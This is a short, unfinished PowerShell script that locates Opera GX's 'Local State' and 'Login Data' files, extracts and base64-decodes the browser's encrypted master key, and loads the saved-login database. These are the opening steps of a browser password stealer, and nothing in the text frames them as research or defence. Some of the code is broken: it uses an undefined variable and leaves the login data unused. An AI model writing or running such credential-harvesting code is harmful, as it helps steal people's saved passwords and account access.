# Specify the path to the Local State file
$localStateFilePathOpera = "$env:APPDATA\Opera Software\Opera GX Stable\Local State"
$loginDataFilePathOpera = "$env:APPDATA\Opera Software\Opera GX Stable\Login Data"

function Get-Key {
    # Check if the file exists
    if (Test-Path -Path $localStateFilePathOpera) {
        # Read the content of the Local State file
        $content = Get-Content -Path $localStateFilePathOpera -Raw

        # Convert JSON content to PowerShell object
        $jsonObject = $content | ConvertFrom-Json

        # Specify the key you want to retrieve

        # Check if the key exists in the JSON object
        if ($jsonObject.os_crypt.encrypted_key) {
            # Output the value of the specified key
            return $jsonObject.os_crypt.encrypted_key
        } else {
            Write-Output "Key '$desiredKey' not found in the JSON object."
        }
    } else {
        Write-Output "Local State file not found."
    }
}

$content2 = Get-Content -Path $loginDataFilePathOpera -Raw
$key = Get-Key
Write-Output $key

# Decode the Base64 string to bytes
$decodedBytes = [System.Convert]::FromBase64String($key)

# Convert the bytes to UTF-8 string
$utf8String = [System.Text.Encoding]::UTF8.GetString($decodedBytes)

# Output or use the UTF-8 string as needed
Write-Output $utf8String